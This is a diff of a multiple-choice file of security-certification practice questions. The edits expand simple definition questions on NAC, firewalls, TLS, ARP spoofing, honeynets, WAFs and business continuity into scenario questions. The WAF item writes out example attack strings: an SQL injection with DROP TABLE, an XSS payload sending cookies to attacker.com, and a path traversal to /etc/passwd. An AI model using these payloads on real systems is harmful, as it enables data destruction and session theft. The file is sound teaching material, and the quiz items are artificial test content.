@@ -2011,12 +2011,12 @@
       // Additional Network Security (10 more)
       {
         domain: "Network Security",
-        question: "What is the purpose of network access control (NAC)?",
+        question: "Your organization's network was recently compromised when a contractor's laptop infected with malware connected to the corporate network and spread ransomware to servers. Investigation revealed the contractor's laptop hadn't been patched in 6 months, was missing antivirus software, and had a weak password—but IT had no way to check device security before granting network access. The security team proposes implementing a solution that acts as a gatekeeper: before any device (employee laptop, contractor tablet, guest phone, IoT device) can access the corporate network, the system must verify: Is the operating system fully patched with current security updates? Is approved antivirus/EDR software installed and up to date? Is the device encrypted? Does it have a screen lock configured? Is it registered and approved for corporate access? Devices that fail these checks are either blocked completely or quarantined to a restricted network with internet-only access until they remediate security issues. Only devices meeting all security requirements receive full network access. What technology enforces these device security compliance requirements before allowing network access?",
         choices: [
-          "To encrypt all network traffic",
-          "To enforce security policies on devices before allowing network access",
-          "To increase network speed",
-          "To replace firewalls"
+          "Technology that encrypts all network traffic between devices automatically",
+          "Technology that enforces security policy compliance on devices before allowing network access",
+          "Technology that increases network bandwidth and connection speeds",
+          "Technology that completely replaces firewalls throughout the organization"
         ],
         correct: 1,
         explanation: "NAC verifies devices meet security requirements (patches, antivirus, configuration) before granting network access, ensuring only compliant devices connect to the network.",
@@ -2028,12 +2028,12 @@
       },
       {
         domain: "Network Security",
-        question: "What is the difference between stateful and stateless firewalls?",
+        question: "Your organization evaluates two firewall products for the network perimeter: **Firewall A (Simple Packet Filtering):** Examines each network packet individually in isolation. When a packet from IP 203.0.113.50 port 54321 destined for your web server port 443 arrives, the firewall checks if a rule allows traffic to port 443. If yes, it permits the packet. If a response packet from your web server port 443 back to 203.0.113.50 port 54321 arrives, the firewall again evaluates it independently against rules—there's no memory that this is a response to a previous request. The firewall has no concept of 'connections' or 'sessions', treating each packet as a completely independent event without any historical context. This makes it faster but less intelligent. **Firewall B (Connection-Aware Filtering):** Tracks the complete state of network connections in memory. When the initial packet from 203.0.113.50:54321 to web server port 443 arrives, the firewall not only checks the rule but also creates a connection entry remembering: connection from 203.0.113.50:54321 to server:443, state=ESTABLISHED, packets exchanged, bytes transferred. When the response packet arrives from server:443 to 203.0.113.50:54321, the firewall recognizes this is part of an existing legitimate connection and allows it automatically, understanding the full context. It can detect anomalies like response packets without matching requests. What distinguishes these two firewall architectures?",
         choices: [
-          "Stateful tracks connection state; stateless examines packets individually",
-          "Stateless is more secure than stateful",
-          "Stateful only works on wireless networks",
-          "They are the same thing"
+          "Stateful firewalls track connection state and context; stateless firewalls examine packets individually without connection history",
+          "Stateless firewalls are always more secure than stateful firewalls in every scenario",
+          "Stateful firewalls work exclusively on wireless networks while stateless work only on wired networks",
+          "They are completely identical technologies with different marketing names"
         ],
         correct: 0,
         explanation: "Stateful firewalls track connection state and context, remembering previous packets. Stateless firewalls evaluate each packet independently without connection history.",
@@ -2045,12 +2045,12 @@
       },
       {
         domain: "Network Security",
-        question: "What does TLS (Transport Layer Security) provide?",
+        question: "A customer visits your company's e-commerce website to purchase products using their credit card. During checkout, they notice a padlock icon in the browser address bar and 'https://' in the URL. Behind the scenes, several security processes occur: The customer's browser and your web server perform a cryptographic handshake establishing encryption keys. When the customer enters credit card number 4532-1234-5678-9010, the browser encrypts it using AES-256 before transmission over the internet. The encrypted data traveling through multiple networks and routers appears as random gibberish to anyone intercepting the traffic—ISPs, Wi-Fi operators, or attackers cannot read the credit card number. Your server receives the encrypted data and decrypts it using the established keys. Additionally, cryptographic message authentication codes verify the data wasn't tampered with in transit—if attackers modified even one bit of the encrypted credit card data, the server would detect the tampering and reject the connection. What security protocol provides this encryption and integrity protection for data traveling across networks?",
         choices: [
-          "Physical network security",
-          "Encryption and integrity for data in transit",
-          "User authentication only",
-          "Network speed optimization"
+          "A protocol that provides physical security for network infrastructure and cabling",
+          "TLS (Transport Layer Security) which encrypts data in transit and verifies integrity protecting against eavesdropping and tampering",
+          "A protocol that exclusively performs user authentication without any encryption capabilities",
+          "A protocol designed for optimizing network speed through data compression"
         ],
         correct: 1,
         explanation: "TLS encrypts data in transit between systems and verifies data integrity, protecting against eavesdropping and tampering. HTTPS uses TLS to secure web traffic.",
@@ -2062,12 +2062,12 @@
       },
       {
         domain: "Network Security",
-        question: "What is ARP spoofing?",
+        question: "An attacker on your company's local network wants to intercept traffic between Alice's computer (IP: 192.168.1.50) and the corporate file server (IP: 192.168.1.10). Normally, when Alice's computer needs to communicate with 192.168.1.10, it broadcasts an ARP request asking 'Who has IP address 192.168.1.10? Please send me your MAC address.' The legitimate file server responds 'That's me! My MAC address is AA:BB:CC:DD:EE:FF', and Alice's computer stores this mapping in its ARP cache for future use. The attacker launches an ARP spoofing attack: They send unsolicited fake ARP messages to Alice's computer claiming 'I am 192.168.1.10 (the file server), and my MAC address is 11:22:33:44:55:66'—but 11:22:33:44:55:66 is actually the attacker's MAC address, not the file server's. Alice's computer, trusting the fake ARP message, updates its ARP cache with incorrect information. Now when Alice tries to access the file server, her computer sends traffic to the attacker's MAC address instead of the legitimate server. The attacker receives all traffic, can read or modify it, then forwards it to the real file server to avoid detection—a perfect man-in-the-middle attack. What is this attack technique that sends false ARP messages to associate the attacker's MAC address with legitimate IP addresses?",
         choices: [
-          "Encrypting network traffic",
-          "Sending false ARP messages to associate attacker's MAC with legitimate IP",
-          "Scanning for open ports",
-          "Blocking network access"
+          "A defensive technique for encrypting network traffic to protect confidentiality",
+          "An attack technique sending false ARP messages to associate the attacker's MAC address with legitimate IP addresses for traffic interception",
+          "A legitimate network administration tool for scanning and discovering open ports on systems",
+          "A security control for blocking unauthorized network access attempts"
         ],
         correct: 1,
         explanation: "ARP spoofing sends fake ARP messages associating the attacker's MAC address with a legitimate IP, allowing man-in-the-middle attacks by redirecting traffic through the attacker.",
@@ -2079,12 +2079,12 @@
       },
       {
         domain: "Network Security",
-        question: "What is a honeynet?",
+        question: "Your organization's security research team wants to study attacker tactics, techniques, and procedures to improve defenses, but they cannot ethically or legally observe attacks against production systems. The team proposes creating a completely isolated fake network environment: They deploy seemingly vulnerable Windows and Linux servers with unpatched operating systems, a deliberately misconfigured database server appearing to contain 'customer data' (actually fake records), web applications with known SQL injection vulnerabilities, file servers with weak passwords, and vulnerable IoT devices. They advertise this fake network's existence through subtle internet breadcrumbs hoping attackers discover it. The entire environment is heavily monitored with logging, network traffic capture, and behavioral analysis tools. When attackers inevitably discover and compromise these systems, the security team observes every action: what tools they use, what vulnerabilities they exploit, what data they search for, what lateral movement techniques they employ, and how they attempt to maintain persistence. Since everything in this environment is fake with no production impact, attackers can be studied safely providing invaluable threat intelligence. What is this network of decoy systems designed to attract and study attackers called?",
         choices: [
-          "A fast network connection",
-          "A network of decoy systems to attract and study attackers",
-          "A wireless mesh network",
-          "A backup network connection"
+          "A high-speed premium network connection providing maximum bandwidth",
+          "A network of decoy systems designed to attract attackers and study their methods for threat intelligence",
+          "A wireless mesh network topology for distributed connectivity",
+          "A redundant backup network connection for ensuring business continuity"
         ],
         correct: 1,
         explanation: "A honeynet is a network of honeypots (decoy systems) designed to attract attackers, allowing security teams to study attack methods and gather threat intelligence safely.",
@@ -2130,12 +2130,12 @@
       },
       {
         domain: "Network Security",
-        question: "What is the purpose of a web application firewall (WAF)?",
+        question: "Your organization's customer-facing web application handles sensitive data including customer accounts, payment processing, and personal information. Traditional network firewalls protect the network perimeter blocking traffic to unauthorized ports and IP addresses, but attackers increasingly exploit application-layer vulnerabilities that network firewalls cannot detect: **Attack 1 - SQL Injection:** Attacker submits malicious input through a product search form: `' OR '1'='1'; DROP TABLE customers; --` attempting to manipulate database queries to steal or destroy data. **Attack 2 - Cross-Site Scripting (XSS):** Attacker posts a comment containing malicious JavaScript: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>` attempting to steal other users' session cookies. **Attack 3 - Path Traversal:** Attacker manipulates a file download parameter: `download.php?file=../../../../etc/passwd` attempting to access unauthorized system files. Network firewalls permit this HTTP traffic to the web server on port 443 (legitimate port) from internet IP addresses (legitimate source)—they cannot inspect the actual application-layer content to detect these sophisticated attacks. The security team proposes deploying a specialized security device that sits between users and the web application, inspecting every HTTP/HTTPS request and response, analyzing parameters and payloads to block malicious patterns while allowing legitimate traffic. What type of security device provides this application-layer protection?",
         choices: [
-          "To protect web applications from attacks like SQL injection and XSS",
-          "To speed up website loading",
-          "To create website backups",
-          "To design web pages"
+          "A web application firewall (WAF) protecting applications from attacks like SQL injection, XSS, and CSRF by filtering malicious HTTP/HTTPS traffic",
+          "A content delivery network (CDN) designed to speed up website loading through geographic distribution",
+          "A backup system for creating and storing website data copies",
+          "A web development tool for designing and creating web page layouts"
         ],
         correct: 0,
         explanation: "A WAF monitors, filters, and blocks HTTP/HTTPS traffic to web applications, protecting against application-layer attacks like SQL injection, XSS, and CSRF.",
@@ -2216,12 +2216,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "Your data center operates 200 critical servers supporting business operations. Over the past 3 years, the operations team has tracked server reliability: Server Model A (50 units) has averaged 30,000 hours of continuous operation before experiencing hardware failures requiring replacement or major repair; Server Model B (100 units) averages only 15,000 hours before failure; Server Model C (50 units) averages an impressive 50,000 hours between failures. The CFO is planning a major hardware refresh and asks which server model provides the best reliability and uptime. The capacity planning team explains they should select Server Model C because its 50,000-hour average operational time between failures means fewer disruptions, lower maintenance costs, and better availability compared to the other models. What reliability metric are they using to make this hardware selection decision?",
+        question: "Your data center operates 200 critical servers supporting business operations. Over the past 3 years, the operations team has tracked server reliability: Server Model A (50 units) has averaged 30,000 hours of continuous operation before experiencing hardware failures requiring replacement or major repair; Server Model B (100 units) averages only 15,000 hours before failure; Server Model C (50 units) averages an impressive 50,000 hours between failures. The CFO is planning a major hardware refresh and asks which server model provides the best reliability and uptime. The capacity planning team explains they should select Server Model C because its 50,000-hour average operational time between failures means fewer disruptions, lower maintenance costs, and better availability compared to the other models. What reliability metric measuring average operational time before system failures are they using to make this hardware selection decision?",
         choices: [
-          "The average time systems operate successfully before failing (MTBF)",
-          "The time required to repair failed systems after failure",
-          "The maximum acceptable downtime for operations",
-          "The financial cost of system failures"
+          "Mean Time Between Failures (MTBF)—the average time systems operate successfully before failing",
+          "Mean Time To Repair (MTTR)—the time required to repair failed systems after failure occurs",
+          "Recovery Time Objective (RTO)—the maximum acceptable downtime for business operations",
+          "Total Cost of Ownership (TCO)—the financial cost of system failures and maintenance"
         ],
         correct: 0,
         explanation: "MTBF measures the average time a system operates successfully between failures. Higher MTBF indicates more reliable systems with longer periods of operation.",
@@ -2233,12 +2233,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "Your organization's Business Impact Analysis for the customer order processing system reveals escalating consequences over time: After 1 hour down: minor inconvenience, orders queue, customers wait but remain patient. After 4 hours down: customer frustration grows, some abandon carts, competitors benefit, revenue loss begins. After 12 hours down: major customer dissatisfaction, significant revenue loss, social media complaints emerge, brand reputation damage starts. After 24 hours down: customers defect to competitors permanently, major contracts at risk, regulatory penalties possible, severe financial impact. After 48 hours down: irreparable customer loss, business viability threatened, regulatory action, potential business failure. The BIA team determines that beyond 24 hours of downtime, the damage becomes so severe that the company may not survive—customer relationships would be irreparably destroyed and financial losses catastrophic. Therefore, Recovery Time Objective (RTO) for this system must be significantly less than 24 hours. What does this 24-hour threshold represent?",
+        question: "Your organization's Business Impact Analysis for the customer order processing system reveals escalating consequences over time: After 1 hour down: minor inconvenience, orders queue, customers wait but remain patient. After 4 hours down: customer frustration grows, some abandon carts, competitors benefit, revenue loss begins ($10K/hour). After 12 hours down: major customer dissatisfaction, significant revenue loss ($150K total), social media complaints emerge, brand reputation damage starts. After 24 hours down: customers defect to competitors permanently, major contracts at risk, regulatory penalties possible ($500K+ total losses), severe financial impact. After 48 hours down: irreparable customer loss, business viability threatened, regulatory action, potential business failure. The BIA team determines that beyond 24 hours of downtime, the damage becomes so severe that recovery may be impossible—customer relationships would be irreparably destroyed and financial losses catastrophic threatening company survival. Therefore, the Recovery Time Objective (RTO) for this system must be significantly less than 24 hours to ensure recovery happens before reaching this critical survival threshold. What does this 24-hour critical survival threshold represent?",
         choices: [
-          "When to schedule backup jobs",
-          "The Maximum Tolerable Downtime (MTD)—longest the business can survive without this critical function before facing irreparable harm",
-          "When to expire user passwords",
-          "Required network bandwidth capacity"
+          "The optimal schedule for when to run automated backup jobs",
+          "The Maximum Tolerable Downtime (MTD)—the longest period the business can survive without this critical function before facing irreparable harm or business failure",
+          "The required frequency for when user passwords must expire and be changed",
+          "The required network bandwidth capacity measured in megabits per second"
         ],
         correct: 1,
         explanation: "MTD is the maximum time a business can be without a critical function before facing irreparable harm, severe financial loss, or business failure. RTO must be less than MTD.",
@@ -2250,12 +2250,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "Your small business runs its entire operation through a single critical server: it hosts the company database, email server, file sharing, customer relationship management system, and accounting software. All 30 employees depend on this one server for every business function. Last week, the server's motherboard failed at 9 AM. By 9:05 AM, the entire business was completely shut down—no one could access email, customer data, financial records, or any files. Employees sat idle while the IT contractor drove 2 hours to arrive, diagnosed the problem, ordered an emergency replacement motherboard at 3x normal cost, and finally restored operations at 6 PM—a full 9-hour outage costing thousands in lost productivity and missed customer commitments. The consultant explains this architecture is extremely vulnerable: 'Any component failure on this single server stops your entire business.' What is this architectural vulnerability called?",
+        question: "Your small business runs its entire operation through a single critical server: it hosts the company database, email server, file sharing, customer relationship management system, and accounting software. All 30 employees depend on this one server for every business function. Last week, the server's motherboard failed at 9 AM. By 9:05 AM, the entire business was completely shut down—no one could access email, customer data, financial records, or any files. Employees sat idle while the IT contractor drove 2 hours to arrive, diagnosed the problem, ordered an emergency replacement motherboard at 3x normal cost, and finally restored operations at 6 PM—a full 9-hour outage costing $15,000 in lost productivity and $8,000 in missed customer commitments. The consultant explains this architecture is extremely dangerous: 'Any component failure on this single server stops your entire business. You have no redundancy, no failover, no backup server. This one box is your entire IT infrastructure.' What is this critical architectural vulnerability where one component's failure alone stops the entire system?",
         choices: [
-          "The first component that fails in any system",
-          "A single point of failure (SPOF)—a component whose failure alone stops the entire system",
-          "The weakest security control in the infrastructure",
-          "A backup system that only runs once"
+          "The chronologically first component that fails in any system over time",
+          "A Single Point of Failure (SPOF)—a component whose failure alone causes complete system failure without redundancy",
+          "The weakest security control in the overall infrastructure architecture",
+          "A backup system that is scheduled to run only once per day"
         ],
         correct: 1,
         explanation: "A SPOF is a component that, if it fails, will cause the entire system to fail. Eliminating SPOFs through redundancy improves availability and resilience.",
@@ -2267,12 +2267,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "After experiencing multiple costly outages from single component failures (one server failure shut down operations for 12 hours, one power supply failure caused 6 hours downtime, one network switch failure halted connectivity for 8 hours), your organization redesigns its architecture with parallel components: They deploy two servers in active-active configuration sharing workload—if one fails, the other immediately handles all traffic. They install dual power supplies in all critical systems—if one fails, the second continues providing power without interruption. They implement multiple redundant network switches with automatic failover—if the primary switch fails, backup switches take over instantly. They maintain two separate internet connections from different ISPs—if one goes down, traffic automatically routes through the other. This architecture ensures that no single component failure stops operations. What principle is the organization implementing through these parallel backup components?",
+        question: "After experiencing multiple costly outages from single component failures—one database server failure shut down operations for 12 hours costing $180,000, one power supply failure caused 6 hours downtime losing $90,000, one network switch failure halted connectivity for 8 hours costing $120,000—your organization redesigns its architecture with parallel backup components: They deploy two database servers in active-active configuration sharing workload—if one fails, the other immediately handles all traffic with zero downtime. They install dual power supplies in all critical systems—if one power supply dies, the second continues providing power without any interruption or even a flicker. They implement multiple redundant network switches with automatic failover—if the primary switch fails, backup switches detect the failure within seconds and take over instantly. They maintain two separate internet connections from different ISPs using different physical paths—if Comcast goes down, traffic automatically routes through AT&T. This architecture ensures that no single component failure can stop business operations. What availability principle is the organization implementing through these parallel backup components enabling continued operation despite individual component failures?",
         choices: [
-          "Wasting resources on unnecessary duplicate components",
-          "Providing redundancy—backup components that enable continued operation if primary components fail",
-          "Intentionally slowing down system performance",
-          "Increasing security complexity without availability benefit"
+          "Wastefully spending budget on unnecessary duplicate components that provide no value",
+          "Providing redundancy—deploying backup components that enable continued operation if primary components fail",
+          "Intentionally slowing down overall system performance through complexity",
+          "Increasing security architecture complexity without any availability benefits"
         ],
         correct: 1,
         explanation: "Redundancy provides backup components (systems, power, connections, data) that enable continued operation if primary components fail, eliminating single points of failure.",
@@ -2284,12 +2284,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "Your organization decides to create its first formal Business Continuity Plan. The project manager assembles a cross-functional team and begins a systematic analysis: They interview department heads identifying all business functions (order processing, manufacturing, customer support, payroll, shipping). For each function, they analyze: 'What happens if we lose this capability for 1 hour? 4 hours? 1 day? 1 week?' They document impacts: Order processing down 1 hour = minor delays; down 12 hours = $50K revenue loss and angry customers; down 3 days = customers permanently lost to competitors. They determine Recovery Time Objectives: Order processing RTO = 4 hours (must restore within 4 hours to avoid unacceptable damage). They identify dependencies: Order processing requires database, network, payment systems, and warehouse connectivity. This comprehensive analysis produces a prioritized list showing which functions are most critical and must be recovered first during disasters. What systematic analysis process is the team conducting?",
+        question: "Your organization decides to create its first formal Business Continuity Plan after the CEO read about competitors experiencing devastating outages. The project manager assembles a cross-functional team including representatives from IT, operations, customer service, finance, HR, and manufacturing. They begin a systematic analysis interviewing department heads to identify all business functions: order processing, manufacturing, customer support, payroll processing, shipping and receiving, accounts receivable, inventory management. For each function, they analyze disruption impacts: 'What happens if we lose this capability for 1 hour? 4 hours? 1 day? 1 week?' They document concrete impacts with dollar amounts: Order processing down 1 hour = minor delays, no financial impact; down 12 hours = $50,000 revenue loss and 200 angry customers calling; down 3 days = $500,000 revenue loss, customers permanently moving to competitors, possible regulatory violations. They determine Recovery Time Objectives: Order processing RTO = 4 hours (must restore within 4 hours to avoid unacceptable customer and financial damage). They identify critical dependencies: Order processing requires the customer database, network connectivity, payment systems, and warehouse inventory systems. This comprehensive analysis produces a prioritized list showing which business functions are most critical and must be recovered first during disasters, with quantified justification. What systematic analysis process for identifying critical functions and quantifying disruption impacts is the team conducting?",
         choices: [
-          "Calculating employee salary structures",
-          "Business Impact Analysis (BIA)—identifying critical functions and analyzing disruption impacts to guide continuity planning",
-          "Measuring network bandwidth capacity",
-          "Tracking project budget expenditures"
+          "Calculating employee salary structures and compensation planning for HR purposes",
+          "Business Impact Analysis (BIA)—systematically identifying critical business functions and analyzing disruption impacts to guide continuity planning priorities",
+          "Measuring network bandwidth capacity and performance baselines for IT infrastructure",
+          "Tracking project budget expenditures and financial spending for cost accounting"
         ],
         correct: 1,
         explanation: "A BIA identifies and prioritizes critical business functions, determines the impact of disruptions, and establishes RTO/RPO requirements to guide continuity planning.",
@@ -2301,12 +2301,12 @@
       },
       {
         domain: "Business Continuity",
-        question: "What is the purpose of a disaster declaration?",
+        question: "A major tornado strikes your headquarters building at 2 PM on a Tuesday. The facilities manager immediately assesses damage: the building structure is unsafe, power is out across the entire area, flooding damaged the ground-floor data center, 300 employees evacuated to the parking lot, all on-site operations completely halted. The Crisis Management Team convenes via conference call. The VP of Operations provides status updates. The team must decide: Is this severity enough to activate the formal Disaster Recovery Plan—committing the organization to emergency spending without normal approval processes, redirecting operations to the alternate hot site facility 200 miles away, mobilizing the DR team to restore critical systems from the recovery site, authorizing unlimited overtime for recovery personnel, notifying customers of the situation, and coordinating with insurance? Or can they handle this through normal incident response—bringing in contractors to restore power and pumping water, having employees work from home temporarily? The CEO reviews the damage assessment and formally announces: 'This meets our disaster criteria. I am officially declaring this a disaster and activating our Disaster Recovery Plan. All DR procedures are now in effect. Recovery coordinators, proceed with your assignments. Finance, approve all necessary recovery expenditures.' What is the purpose of this formal disaster declaration by executive management?",
         choices: [
-          "To inform the media about issues",
-          "To formally activate disaster recovery procedures and resources",
-          "To blame responsible parties",
-          "To request government assistance only"
+          "To immediately inform news media outlets about the organization's operational issues",
+          "To formally activate disaster recovery procedures, commit emergency resources, and invoke special authorities for recovery operations",
+          "To assign blame and identify responsible parties for causing the disaster",
+          "To exclusively request federal government assistance without any internal actions"
         ],
         correct: 1,
         explanation: "Disaster declaration is a formal decision by management to activate DR plans, commit resources, and invoke special authorities and procedures to recover from a disaster.",
